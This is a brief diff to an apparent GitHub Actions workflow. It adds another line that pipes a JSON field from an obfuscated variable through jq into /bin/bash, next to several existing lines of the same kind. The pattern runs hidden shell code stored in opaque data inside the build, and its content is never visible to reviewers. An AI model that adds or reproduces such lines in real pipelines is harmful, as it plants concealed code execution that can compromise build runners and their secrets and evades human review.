@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$xfybz2" | jq -r .iqalc2262 | /bin/bash
           echo $x6 | jq -r .jj70737 | /bin/bash
           printf '%s' "$dvtm42366" | jq -r .f10746 | /bin/bash
+          echo $mm52 | jq -r .axv3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
